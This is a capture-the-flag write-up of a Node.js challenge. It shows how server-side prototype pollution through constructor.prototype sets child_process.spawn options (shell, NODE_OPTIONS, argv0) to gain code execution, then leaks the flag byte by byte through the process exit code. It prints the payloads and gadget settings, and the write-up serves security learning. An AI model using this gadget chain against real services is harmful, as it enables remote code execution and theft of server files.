``Backup — Cyberlandslagets kvalik 2026``

The challenge had an /archive endpoint that accepted JSON and returned the config it ended up using:

```json
{
  "status": "Archiving started",
  "config": {
    "archiveName": "daily_backup",
    "compression": "gzip",
    "paths": {
      "logs": "./logs",
      "temp": "./tmp"
    }
  },
  "systemCode": 0
}
```

The endpoint turned out to be vulnerable to server-side prototype pollution through constructor.prototype.

The application blocked ``__proto__``, but the recursive merge still allowed values to be written through constructor.prototype. I first tested this with:

```json
{
  "constructor": {
    "prototype": {
      "stack": "OWNEDSTACK"
    }
  }
}
```

"OWNEDSTACK" then showed up in the stack value, which was enough to confirm that I could pollute Object.prototype.

From prototype pollution to spawn()

The application calls child_process.spawn() as part of the archive operation. The object used by spawn() could inherit properties from Object.prototype, so the next step was figuring out whether any useful process options could be controlled through the pollution.

The useful properties ended up being:
```sh
shell
NODE_OPTIONS
argv0
```

The challenge was running Node on Alpine, so instead of trying to rely on Bash I used /proc/self/exe, which points to the currently running executable.

The gadget was basically:

```sh
shell = /proc/self/exe
NODE_OPTIONS = --require /proc/self/cmdline
argv0 = JavaScript
```

Setting shell to ``/proc/self/exe`` makes the spawned process run Node itself. ``NODE_OPTIONS=--require /proc/self/cmdline`` then makes Node load its own command line, which lets the controlled ``argv0`` value be interpreted as JavaScript.

At this point I had code execution, but getting the flag back was the next problem.

Accidentally killing the service

My first attempt was to just read ``/app/flag.txt`` directly from the spawned process.

That did work far enough to prove that the process settings were being used, but it also killed the service:

``curl: (52) Empty reply from server``

and after that:

``curl: (7) Failed to connect to backup.cfire port 3000``

So blindly trying to print the file was not a very useful way forward.

I then went back to the normal /archive response and noticed the systemCode value:

``"systemCode": 0``

This was the exit code from the spawned process, and that gave me a much simpler way to get data back.

Leaking the flag through systemCode- 

Instead of trying to print the whole file, I read a single byte from it:

``require("fs").readFileSync("/app/flag.txt")[0]``

and used that value as the process exit code:

```js
process.exit(
    require("fs").readFileSync("/app/flag.txt")[0]
);
```

The response came back with:

``"systemCode": 68``, and 68 is ASCII D.

We knew that the flag format was ``DDC{...}``, so I immediately assumed that that was the first byte of the flag.

At that point the primitive was enough to read the flag one byte at a time. For each position, I read a byte from `/app/flag.txt`, used that byte as the process exit code, read the returned `systemCode`, converted it back to a character, incremented the index and repeated until I reached `}`.

```js
readFileSync("/app/flag.txt")[0]
readFileSync("/app/flag.txt")[1]
readFileSync("/app/flag.txt")[2]
```

see exploit.py
<a href="/payloads/backup.py" class="payload-link" data-payload="/payloads/backup.py">[open backup.py]</a>

Running it gave the flag:

``[*] Flag: DDC{pr0t0type_p0llution_1s_ins4ne}``



The prototype pollution was only the entry point. By writing through `constructor.prototype`, I could influence properties inherited by the object passed to `spawn()`. That let me control process options such as `shell`, `NODE_OPTIONS` and `argv0`, which I used to start Node through `/proc/self/exe` and get JavaScript execution via `/proc/self/cmdline`.

The final piece was realizing that I didn't need stdout at all. Since the spawned process's exit code was returned in `systemCode`, I could use `process.exit()` as a tiny output channel and leak the flag one byte at a time.

